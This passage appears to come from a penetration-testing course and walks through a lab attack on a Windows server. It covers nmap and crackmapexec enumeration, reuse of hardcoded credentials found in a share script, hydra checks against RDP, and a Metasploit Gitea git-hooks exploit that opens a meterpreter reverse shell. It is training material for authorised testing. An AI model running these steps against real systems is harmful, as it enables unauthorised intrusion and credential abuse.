-rw-r--r-- 1 root root      5 Mar  3 10:01 Sudoers.txt
-rw-r--r-- 1 root root   1712 Mar  3 10:01 SUID_SGID.txt
-rw-r--r-- 1 root root   5494 Mar  3 10:01 SystemdAutoruns.txt
-rw-r--r-- 1 root root     17 Mar  3 10:01 UFWStatus.txt
-rw-r--r-- 1 root root   2076 Mar  3 10:01 Users.txt
-rw-r--r-- 1 root root     99 Mar  3 10:01 WritablePathDirs.txt

```

* * *

Now, let’s summarize everything we have found with `root` access and take notes of it:

#### System Information

- `OS Details`: Ubuntu system running in a VMware virtual environment
- `Security Protections`: AppArmor is loaded, ASLR enabled, User namespace enabled, Seccomp disabled
- `Kernel Information`: Potentially vulnerable to CVE-2022-32250 (nft\_object UAF vulnerability)

#### Sensitive Credentials

- `SSH Private Key`: Found root's SSH private key at `/root/.ssh/id_rsa`, which could be used for lateral movement
- `MySQL`: WordPress MySQL credentials found in `/var/www/cube-case.htb/wp-config.php`
- `Flag`: Located at /root/flag.txt

#### System Access

- `SUID/SGID Binaries`: 55 binaries with special permissions identified, potential privilege escalation vectors
- `Writable PATH Directories`: 1 directory in PATH is writable, potential for privilege escalation via PATH manipulation

#### Additional Findings

- `Sensitive Files`: 2 sensitive files discovered by the pillaging script
- `Interesting Files`: 28,742 files flagged as potentially interesting
- `Mounted File Systems`: Identified ext4 filesystem and swap space

Since we have written everything down for the Proof-of-Concept and our Documentation for this target, we can move forward and focus on our next target.


# Windows Information Gathering

* * *

For Windows targets, the process is very similar to what we did previouslt. We can use Nmap to obtain an essential overview of the target. However, Windows differs from Linux in the set of default services; typically, RDP and SMB are active. These services allow standard users to access shared servers while enabling administrators to manage them. As always, we begin with the Information Gathering stage.

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](nKsbgcP10NOP)

* * *

We begin by using Nmap with the options to scan without ping ( `-Pn`), all ports ( `-p-`), capture the version of the service ( `-sV`) with the standard scripts for the respective services, and an increased speed ( `-T5`).

```shell
sudo nmap -p- -sV -sC 10.129.12.20 -T5 -Pn

Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-02-23 16:06 EST
Nmap scan report for 10.129.12.20
Host is up (0.029s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
3000/tcp  open  http          Golang net/http server
|_http-title:  Cube Case Gitea
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=e395a074552264a2; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=uZ6gm5xTwEmOsxJTg4e-1VuKws06MTc0MDM0NDg4MzEwNTMzMjgwMA; Path=/; Expires=Mon, 24 Feb 2025 21:08:03 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 23 Feb 2025 21:08:03 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title> Cube Case Gitea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiQ3ViZSBDYXNlIEdpdGVhIiwic2hvcnRfbmFtZSI6IkN1YmUgQ2FzZSBHaXRlYSIsInN0YXJ0X3VybCI6Imh0dHA6Ly8wLjAuMC4wOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly8wLjAuMC4wOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMn
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Set-Cookie: i_like_gitea=7c2f23bd7c3f6266; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=snXz9bwqPGeywxtPwsHN6nXb3es6MTc0MDM0NDg4MzQyNjkzMjgwMA; Path=/; Expires=Mon, 24 Feb 2025 21:08:03 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 23 Feb 2025 21:08:03 GMT
|_    Content-Length: 0
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-02-23T21:09:33+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=WIN01
| Not valid before: 2025-02-22T20:56:06
|_Not valid after:  2025-08-24T20:56:06
<SNIP>
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: WIN01
|   NetBIOS computer name: WIN01\\x00
|   Workgroup: HTBLAB\\x00
|_  System time: 2025-02-23T15:08:55-06:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-02-23T21:08:54
|_  start_date: N/A
|_clock-skew: mean: 1h12m04s, deviation: 2h41m01s, median: 3s

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 157.72 seconds

```

The Nmap scan reveals several open ports and services on a Windows Server 2019 machine (WIN01). The machine is running SSH (port 22), RPC (port 135), NetBIOS (port 139), SMB (port 445), a Gitea web server (port 3000), and Remote Desktop Services (port 3389). The SMB service indicates that the server is part of the HTBLAB workgroup, with message signing enabled but not required—a potential security concern. The Gitea instance on port 3000 appears to be a Golang-based web server named 'Cube Case Gitea.' Additionally, the system has RDP enabled with a valid SSL certificate. Notably, the presence of an SSH server alongside RDP is somewhat unusual.

There is certainly a lot to process, so let us simply examine each of these ports one by one. First of all, the port tcp/3000 appears to be an HTTP server, which means we can use the browser to navigate to it and see what type of applications is displayed.

* * *

## Gitea

[Gitea](https://about.gitea.com/) is a lightweight, self-hosted Git service written in Go. It's designed as a painless, self-hosted alternative to GitHub, providing similar core functionality including repositories, issue tracking, pull requests, and wikis. Since it's open-source and can be easily deployed, it's popular among development teams who want to maintain their code internally.

```shell
firefox http://10.129.12.20:3000

```

![Cube Case Gitea: A self-hosted Git service, easy to install, cross-platform, lightweight, and open source, powered by Gitea version 1.12.4.](QN2igwgqPbQG)

Taking a closer look we can see at the bottom two very interesting parts. First, it reveals the version `1.12.4` of Gitea that is being using on that server and the programming language `Go` with the version `1.14.8`.

As we discussed earlier, Gitea is a lightweight, self-hosted Git service written in Go. It serves as a straightforward alternative to GitHub, offering core functionalities such as repositories, issue tracking, pull requests, and wikis. Its open-source nature and ease of deployment have made it popular among development teams looking to manage their code internally.

* * *

## Server Message Block

Server Message Block ( `SMB`) is a network file sharing protocol, similar to FTP on Linux systems, that allows applications on a computer to read and write to files and request services from server programs. From a cybersecurity standpoint, SMB is critical because it is widely used in Windows networks for file and printer sharing, and it has frequently been targeted by attacks—such as those exploiting vulnerabilities like EternalBlue. Proper security configuration of SMB is essential, as misconfigured shares can lead to unauthorized access, data breaches, and lateral movement within a network, making it a common attack vector for gaining initial access or escalating privileges in corporate environments

Now, let’s examine the SMB server using a tool called `crackmapexec`.

```shell
crackmapexec --help

      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
     /      ||   _  \\         /   \\      /      ||  |/  / |   \\/   |     /   \\     |   _  \\  |   ____|\\  \\ /  / |   ____| /      |
    |  ,----'|  |_)  |       /  ^  \\    |  ,----'|  '  /  |  \\  /  |    /  ^  \\    |  |_)  | |  |__    \\  V  /  |  |__   |  ,----'
    |  |     |      /       /  /_\\  \\   |  |     |    <   |  |\\/|  |   /  /_\\  \\   |   ___/  |   __|    >   <   |   __|  |  |
    |  `----.|  |\\  \\----. /  _____  \\  |  `----.|  .  \\  |  |  |  |  /  _____  \\  |  |      |  |____  /  .  \\  |  |____ |  `----.
     \\______|| _| `._____|/__/     \\__\\  \\______||__|\\__\\ |__|  |__| /__/     \\__\\ | _|      |_______|/__/ \\__\\ |_______| \\______|

                                                A swiss army knife for pentesting networks
                                    Forged by @byt3bl33d3r and @mpgn_x64 using the powah of dank memes

                                           Exclusive release for Porchetta Industries users
                                                       <https://porchetta.industries/>

                                                   Version : 5.4.0
                                                   Codename: Indestructible G0thm0g

options:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {smb,ssh,winrm,ldap,mssql,rdp,ftp}
    smb                 own stuff using SMB
    ssh                 own stuff using SSH
    winrm               own stuff using WINRM
    ldap                own stuff using LDAP
    mssql               own stuff using MSSQL
    rdp                 own stuff using RDP
    ftp                 own stuff using FTP

```

Crackmapexec provides a huge set of modules for both enumerating and attacking multiple services. If you want to understand it's full potential we highly recommend you to go through the [Using CrackMapExec](https://academy.hackthebox.com/course/preview/using-crackmapexec) module. For our approach here, we will focus on the SMB protocol, but feel free to try out other modules against the target to satisfy your curiosity.

```shell
crackmapexec smb --help

usage: crackmapexec smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k] [--use-kcache] [--export EXPORT [EXPORT ...]] [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST]
                        [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {https,http}] [--server-host HOST] [--server-port PORT]
                        [--connectback-host CHOST] [-H HASH [HASH ...]] [--no-bruteforce] [-d DOMAIN | --local-auth] [--port {139,445}] [--share SHARE] [--smb-server-port SMB_SERVER_PORT] [--gen-relay-list OUTPUT_FILE]
                        [--continue-on-success] [--smb-timeout SMB_TIMEOUT] [--laps [LAPS]] [--sam | --lsa | --ntds [{drsuapi,vss}]] [--enabled] [--user USERNTDS] [--shares] [--sessions] [--disks]
                        [--loggedon-users-filter LOGGEDON_USERS_FILTER] [--loggedon-users] [--users [USER]] [--groups [GROUP]] [--computers [COMPUTER]] [--local-groups [GROUP]] [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY]
                        [--wmi-namespace NAMESPACE] [--spider SHARE] [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST] [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]] [--depth DEPTH] [--only-files]
                        [--put-file FILE FILE] [--get-file FILE FILE] [--exec-method {mmcexec,atexec,wmiexec,smbexec}] [--codec CODEC] [--force-ps32] [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE]
                        [--clear-obfscripts]
                        [target ...]

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

options:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...]
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...]
                        password(s) or file(s) containing passwords
  -k, --kerberos        Use Kerberos authentication
  --use-kcache          Use Kerberos authentication from ccache file (KRB5CCNAME)
  --export EXPORT [EXPORT ...]
                        Export result into a file, probably buggy
<SNIP>

```

It has many different options as well. Let's specify "smb" and set the IP address of our target and see what it finds.

```shell
crackmapexec smb 10.129.12.20

SMB         10.129.12.20  445    WIN01            [*] Windows Server 2019 Standard 17763 x64 (name:WIN01) (domain:WIN01) (signing:False) (SMBv1:True)

```

An interesting discovery here is that SMBv1 is enabled. This is the oldest version of SMB and is typically disabled by default. It is usually enabled on older systems that do not support SMBv2 or SMBv3. In large networks, this can indicate the presence of outdated systems, which may increase the likelihood of encountering critical vulnerabilities that have not yet been patched.

Next, let’s check if a NULL session (anonymous login) is possible while enumerating existing users using the `--users` option. For this test, we will leave the options for user ( `-u`) and password ( `-p`) empty."

```shell
crackmapexec smb 10.129.12.20 -u '' -p '' --users

SMB         10.129.12.20  445    WIN01            [*] Windows Server 2019 Standard 17763 x64 (name:WIN01) (domain:WIN01) (signing:False) (SMBv1:True)
SMB         10.129.12.20  445    WIN01            [+] WIN01\\:
SMB         10.129.12.20  445    WIN01            [-] Error enumerating domain users using dc ip 10.129.12.20: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
SMB         10.129.12.20  445    WIN01            [*] Trying with SAMRPC protocol

```

On the one hand, we were able to access the SMB service using a NULL session, yet we could not enumerate any users. On the other, if the Guest account is enabled, we can try accessing it without credentials to enumerate available shares. For this, we will specify the user as `guest` and instruct `crackmapexec` to enumerate shares using the `--shares` option.

```shell
crackmapexec smb 10.129.12.20 -u guest -p '' --shares

SMB         10.129.12.20  445    WIN01            [*] Windows Server 2019 Standard 17763 x64 (name:WIN01) (domain:WIN01) (signing:False) (SMBv1:True)
SMB         10.129.12.20  445    WIN01            [+] WIN01\\guest:
SMB         10.129.12.20  445    WIN01            [+] Enumerated shares
SMB         10.129.12.20  445    WIN01            Share           Permissions     Remark
SMB         10.129.12.20  445    WIN01            -----           -----------     ------
SMB         10.129.12.20  445    WIN01            ADMIN$                          Remote Admin
SMB         10.129.12.20  445    WIN01            C$                              Default share
SMB         10.129.12.20  445    WIN01            Devs
SMB         10.129.12.20  445    WIN01            IPC$                            Remote IPC

```

![GIF showcasing the usage of CrackMapExec to obtain information about public shares.](wlG7Pvr2128O.gif)

Let’s summarize the key findings from our Windows target and take notes of it. We have found that:

- The target is running Windows Server 2019 Standard (x64)
- Several services were detected, including Gitea version 1.12.4 and Go version 1.14.8
- SMBv1 is enabled, which is unusual as it's typically disabled by default and could indicate the presence of legacy systems
- Anonymous (NULL) session access was possible, but with limited permissions
- The Guest account is active and could enumerate shares: ADMIN$ (Remote Admin), C$ (Default share), Devs (Custom share), IPC$ (Remote IPC)

This is a great start and the results give us several points we can use for initial access on the target.


# Windows Initial Access

* * *

Once we've have gathered all the information, we can proceed to the exploitation stage. First, let’s review what we’ve discovered so far:

- The target is running Windows Server 2019 Standard (x64)

- Several services were detected, including Gitea version 1.12.4 and Go version 1.14.8

- SMBv1 is enabled, which is unusual as it's typically disabled by default and could indicate the presence of legacy systems

- Anonymous (NULL) session access was possible, but with limited permissions

- The Guest account is active and could enumerate shares: ADMIN$ (Remote Admin), C$ (Default share), Devs (Custom share), IPC$ (Remote IPC)


Although we completed the Information Gathering phase using `crackmapexec`, that doesn't mean we have to switch tools. Let's continue using it and see what type of results we get.

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](WtQcAqSmaSi0)

* * *

## SMB Exploitation

SMB is a protocol that has been around for decades, and has a history ripe with vulnerabilities. The infamous EternalBlue vulnerability, used to spread the Wannacry ransomware back in 2017, targeted and exploited SMB. Malicious actors have used this vulnerability to sneak into systems, spread malware, or even create botnets. Older versions, like SMBv1, were especially "leaky", lacking proper encryption and authentication checks. Over time, Microsoft patched things up, pushing SMBv3 with better security.

If you remember, we found credentials on the previous Linux target for the user `john` with the password `SuperSecurePass123`. Let’s try them out and try to spider ( `--spider`) the custom share ( `Devs`) that we have found. If the credentials are correct, it could reveal more information about the contents in the share.

```shell
crackmapexec smb 10.129.12.20 -u "john" -p 'SuperSecurePass123' --spider Devs --pattern .

SMB         10.129.12.20  445    WIN01            [*] Windows Server 2019 Standard 17763 x64 (name:WIN01) (domain:WIN01) (signing:False) (SMBv1:True)
SMB         10.129.12.20  445    WIN01            [+] WIN01\\john:SuperSecurePass123
SMB         10.129.12.20  445    WIN01            [*] Started spidering
SMB         10.129.12.20  445    WIN01            [*] Spidering .
SMB         10.129.12.20  445    WIN01            //10.129.12.20/Devs/. [dir]
SMB         10.129.12.20  445    WIN01            //10.129.12.20/Devs/.. [dir]
SMB         10.129.12.20  445    WIN01            //10.129.12.20/Devs/tmp.ps1 [lastm:'2025-02-23 16:32' size:1145]
SMB         10.129.12.20  445    WIN01            [*] Done spidering (Completed in 0.08351707458496094)

```

In this case, the credentials worked along with spidering the custom share. This confirms that the credentials are correct and that the user `john` has read permissions for the Devs share. It also indirectly indicates that `john` is likely involved in development processes—possibly as a developer, administrator, or even a manager overseeing those processes. We should note this for later reference if necessary.

Now, let’s specify the Devs share and download the file `tmp.ps1` that we found. The file extension suggests that it is most likely a PowerShell script.

```shell
crackmapexec smb 10.129.12.20 -u "john" -p 'SuperSecurePass123' --share Devs --get-file tmp.ps1 tmp.ps1

SMB         10.129.12.20  445    WIN01            [*] Windows Server 2019 Standard 17763 x64 (name:WIN01) (domain:WIN01) (signing:False) (SMBv1:True)
SMB         10.129.12.20  445    WIN01            [+] WIN01\\john:SuperSecurePass123
SMB         10.129.12.20  445    WIN01            [*] Copy tmp.ps1 to tmp.ps1
SMB         10.129.12.20  445    WIN01            [+] File tmp.ps1 was transferred to tmp.ps1

```

Once the download is complete, we can inspect script's contents and see if there's anything interesting or useful for us.

```shell
cat tmp.ps1

```

```powershell
# Script: CopyFileFromRemoteShare.ps1
$username = "WIN01\\john"
$password = "SuperSecurePass123"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)

$remoteShare = "\\\\FileServer01\\SharedFolder"
$sourceFileName = Read-Host -Prompt "File> "
$sourceFile = "$remoteShare\\$sourceFileName"
$destinationFile = "C:\\Temp\\$sourceFileName"
$destinationDir = "C:\\Temp"

if (-not (Test-Path $destinationDir)) {
    New-Item -Path $destinationDir -ItemType Directory -Force
}

try {
    New-PSDrive -Name "Z" -PSProvider FileSystem -Root $remoteShare -Credential $credential -ErrorAction Stop

    if (Test-Path "Z:\\$sourceFileName") {
        Copy-Item -Path "Z:\\$sourceFileName" -Destination $destinationFile -Force
        Write-Output "File copied successfully to $destinationFile"
    } else {
        Write-Output "Error: File '$sourceFileName' not found in $remoteShare"
    }
} catch {
    Write-Output "An error occurred: $_"
} finally {
    Remove-PSDrive -Name "Z" -Force -ErrorAction SilentlyContinue
}

```

At this point, we can see that the script contains hardcoded credentials, which is not best practice in production environments. However, this also suggests that a local user, `john`, might exist on the system, and these credentials could be valid. It highlights an issue of password reuse, which often occurs when employees do not use—or are not provided with—a password manager by their company. Memorizing complex passwords can be challenging, and many people opt for the convenience of using one 'strong' password for everything. Even if employees believe they are unlikely to be hacked or that their password is strong enough, this false sense of security can lead to serious consequences.

However, with these credentials now in our possession, we can try them against another service such as RDP. Also, we can check if they are valid by using a brute-force tool called `hydra`. Be aware that brute forcing in general is to be considered as a last resort, due to the "noise" of the attack and the large number of alerts that will be produced in a hardened environment (which could lead to being banned from the network). But since we have just a single set of credentials to verify, we can use it on RDP like so:

```shell
hydra -l john -p "SuperSecurePass123" rdp://10.129.12.20

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (<https://github.com/vanhauser-thc/thc-hydra>) starting at 2025-02-24 10:09:23
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking rdp://10.129.12.20:3389/
[3389][rdp] host: 10.129.12.20   login: john   password: SuperSecurePass123
1 of 1 target successfully completed, 1 valid password found
Hydra (<https://github.com/vanhauser-thc/thc-hydra>) finished at 2025-02-24 10:09:24

```

As you can see, `hydra` just confirmed that these credentials are valid and we can use an RDP session to work on our target.

* * *

## Gitea Exploitation

Now, let’s jump to Gitea. We will use `msfconsole` again and search through the database for any known exploits.

```shell
msfconsole -q

msf6> search gitea

Matching Modules
================

   #   Name                                    Disclosure Date  Rank       Check  Description
   -   ----                                    ---------------  ----       -----  -----------
   0   exploit/multi/http/gitea_git_fetch_rce  2022-05-16       excellent  Yes    Gitea Git Fetch Remote Code Execution
   1     \\_ target: Unix Command               .                .          .      .
   2     \\_ target: Linux Dropper              .                .          .      .
   3     \\_ target: Windows Command            .                .          .      .
   4     \\_ target: Windows Dropper            .                .          .      .
   5   exploit/multi/http/gitea_git_hooks_rce  2020-10-07       excellent  Yes    Gitea Git Hooks Remote Code Execution
   6     \\_ target: Unix Command               .                .          .      .
   7     \\_ target: Linux Dropper              .                .          .      .
   8     \\_ target: Windows Command            .                .          .      .
   9     \\_ target: Windows Dropper            .                .          .      .
   10  exploit/multi/http/gogs_git_hooks_rce   2020-10-07       excellent  Yes    Gogs Git Hooks Remote Code Execution
   11    \\_ target: Unix Command               .                .          .      .
   12    \\_ target: Linux Dropper              .                .          .      .
   13    \\_ target: Windows Command            .                .          .      .
   14    \\_ target: Windows Dropper            .                .          .      .

```

Metasploit shows us three different exploits. Let’s take a look at the second exploit with the target set as `Windows Dropper`.

```shell
msf6 > info 9

       Name: Gitea Git Hooks Remote Code Execution
     Module: exploit/multi/http/gitea_git_hooks_rce
   Platform: Unix, Linux, Windows
       Arch: cmd, x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2020-10-07

Provided by:
  Podalirius
  Christophe De La Fuente

Module side effects:
 artifacts-on-disk
 ioc-in-logs

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
      0   Unix Command
      1   Linux Dropper
      2   Windows Command
  =>  3   Windows Dropper

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  PASSWORD                    yes       Password to use
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see <https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html>
  RPORT      3000             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /                yes       Base path
  URIPATH                     no        The URI to use for this exploit (default is random)
  USERNAME                    yes       Username to authenticate with
  VHOST                       no        HTTP server virtual host

<SNIP>

Payload information:

Description:
  This module leverages an insecure setting to get remote code
  execution on the target OS in the context of the user running Gitea.
  This is possible when the current user is allowed to create `git
  hooks`, which is the default for administrative users. For
  non-administrative users, the permission needs to be specifically
  granted by an administrator.

  To achieve code execution, the module authenticates to the Gitea web
  interface, creates a temporary repository, sets a `post-receive` git
  hook with the payload and creates a dummy file in the repository.
  This last action will trigger the git hook and execute the payload.
  Everything is done through the web interface.

  It has been mitigated in version 1.13.0 by setting the Gitea
  `DISABLE_GIT_HOOKS` configuration setting to `true` by default. This
  disables this feature and prevents all users (including admin) from
  creating custom git hooks.

  This module has been tested successfully against docker versions 1.12.5,
  1.12.6 and 1.13.6 with `DISABLE_GIT_HOOKS` set to `false`, and on
  version 1.12.6 on Windows.

```

The description states that the vulnerability has been patched in the version 1.13.0, which is higher than we have found on our current Windows target. This indicates that our target might still be vulnerable. In the options we also see the a `username` and `password` are required. Let’s set them to the credentials we know.

```shell
msf6> use 9
msf6 exploit(multi/http/gitea_git_hooks_rce) > set lhost tun0
msf6 exploit(multi/http/gitea_git_hooks_rce) > set rhosts 10.129.12.20
msf6 exploit(multi/http/gitea_git_hooks_rce) > set username john
msf6 exploit(multi/http/gitea_git_hooks_rce) > set password SuperSecurePass123

msf6 exploit(multi/http/gitea_git_hooks_rce) > options

Module options (exploit/multi/http/gitea_git_hooks_rce):

   Name       Current Setting     Required  Description
   ----       ---------------     --------  -----------
   PASSWORD   SuperSecurePass123  yes       Password to use
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.12.20      yes       The target host(s), see <https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html>
   RPORT      3000                yes       The target port (TCP)
   SSL        false               no        Negotiate SSL/TLS for outgoing connections
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                   yes       Base path
   URIPATH                        no        The URI to use for this exploit (default is random)
   USERNAME   john                yes       Username to authenticate with
   VHOST                          no        HTTP server virtual host

   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   3   Windows Dropper

```

Once we have set the options, we run the exploit against the target and see if it works.

```shell
msf6 exploit(multi/http/gitea_git_hooks_rce) > run

[*] Started reverse TCP handler on 10.10.16.14:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Gitea version is 1.12.4
[*] Executing Windows Dropper for windows/x64/meterpreter/reverse_tcp
[*] Authenticate with "john/SuperSecurePass123"
[+] Logged in
[*] Create repository "Asoka_Sub-Ex"
[+] Repository created
[*] Setup post-receive hook with command
[+] Git hook setup
[*] Create a dummy file on the repo to trigger the payload
[+] File created
[*] Command Stager progress -  20.14% done (2046/10161 bytes)
[*] Setup post-receive hook with command
[+] Git hook setup
<SNIP>
[*] Command Stager progress - 100.00% done (10161/10161 bytes)
[*] Sending stage (203846 bytes) to 10.129.12.20
[*] Meterpreter session 1 opened (10.10.16.14:4444 -> 10.129.12.20:49740) at 2025-03-05 17:08:35 -0500
[*] Cleaning up
[*] Repository Asoka_Sub-Ex deleted.

meterpreter >

```

![GIF showcasing the use of the exploit to obtain a reverse shell connection.](uHKFxUB9Vdka.gif)

Let's break down what happened above. First, we started a TCP handler that waited for a connection from the target. Then, the exploit created a temporary repository, set up a malicious git hook, and triggered it to achieve remote code execution, which resulted in a reverse shell connection. As a result, we now have a successful `meterpreter` shell running.

At this point, we have several options for proceeding. Without diving too deeply into additional tools and their usage, let's connect directly to the target using RDP.

```shell
xfreerdp /u:john /p:"SuperSecurePass123" /v:10.129.12.20 /w:1366 /h:768

[17:09:37:026] [3913658:3913659] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[17:09:37:026] [3913658:3913659] [WARN][com.freerdp.crypto] - CN = WIN01
[17:09:39:731] [3913658:3913659] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[17:09:39:731] [3913658:3913659] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[17:09:39:775] [3913658:3913659] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[17:09:39:775] [3913658:3913659] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[17:09:41:201] [3913658:3913659] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]

```

This command will open a new window and show us the Windows desktop. After a quick powershell command, we see that our RDP session is authenticated as the user `john`.

![Windows desktop showing PowerShell with 'whoami' command output: 'win01\john'.](B7DBX1RDcPdx)

* * *

Let’s summarize everything that we have discovered.:

- We found a Windows Server 2019 Standard system with several vulnerabilities

- The server was running an outdated version of Gitea (1.12.4) which had a known security flaw

- We discovered active user credentials for a user named `john`

- The system had SMBv1 enabled and an active Guest account, both potential security risks

- We successfully exploited the Gitea vulnerability using Metasploit to gain initial access

- Finally, we established a more stable connection using RDP with the discovered credentials


# Windows System Enumeration

* * *

Now that we have access to the Windows target, let's begin gathering internal information. The key objective is to understand what type of system we are dealing with, its purpose, and how it is configured—details that we couldn't obtain without local access. We can focus on the following areas, among others:

- User privileges and group memberships
- System tasks and scheduled processes
- Network configurations and listening ports
- Detailed system information like OS version, hardware details, and installed updates

By analyzing the gathered data, we can build a comprehensive understanding of the system's security configurations and get an idea of how to escalate our privileges. We can work either using the GUI or the command prompt. Since the Windows target has SSH running and we have a meterpreter shell running, let’s stick to the command prompt.

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](QmRv0pzC2KgN)

* * *

## User Information

First of all, we need to determine who we are on the target system. We've already established that we the `john` user, but we need to ascertain what permissions the account has.

```powershell
PS C:\Users\john> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
